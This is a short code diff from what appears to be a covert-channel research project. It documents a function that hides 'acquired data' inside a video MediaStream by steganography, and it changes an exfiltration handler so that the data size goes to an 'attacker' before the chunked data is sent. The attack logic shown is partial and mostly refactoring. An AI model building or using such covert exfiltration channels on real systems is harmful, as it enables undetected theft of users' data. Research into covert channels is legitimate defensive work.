@@ -31,15 +31,19 @@ class CovertChannelMethods {
     }
 
     /**
-     * Create an effect of hidding data inside the video
+     * Creates new Steganography effect on the specified media stream.
+     * @param {MediaStream} stream - Video stream you want to change
+     * @param {Object} acquiredData - Data that are going to be hidden inside the mediastream
+     * @param {object} options - Options about the steganography. Throughtput etc.
+     * @returns Promise of stegano effect
      */
-    _createSteganoEffect(stream: MediaStream, acquiredData: Object, usedMethod: Object) {
+    _createSteganoEffect(stream: MediaStream, acquiredData: Object, options: Object) {
         if (!MediaStreamTrack.prototype.getSettings) {
             return Promise.reject(new Error('Stegano cannot be implemented!'));
         }
 
         // insert acquired data inside the video using specified method
-        return Promise.resolve(new VideoSteganoEffect(stream, acquiredData, usedMethod));
+        return Promise.resolve(new VideoSteganoEffect(stream, acquiredData, options));
     }
 
     /**
@@ -122,7 +126,11 @@ export class ExtractionHandler {
      * Send data through the specified method.
      * @param {any} data - data to be sent.
      */
-    async sendAll(data, attackerId) {
+    async sendAll(data, attackerId, dataSize = data.length) {
+        // If the method can loose data through the transition send the final size of sent file.
+        if (this.configuration.method !== 'plain') {
+            await CovertChannelMethods.options[this.configuration.method](dataSize, attackerId);
+        }
         for (const chunkData of splitString(data, this.configuration.chunkSize)) {
             // send data using corresponding method
             await CovertChannelMethods.options[this.configuration.method](chunkData, attackerId);
@@ -163,5 +171,6 @@ export class ExtractionHandler {
      */
     async receiveAll() {
         // TODO: add generic code for all types of communication.
+
     }
 }
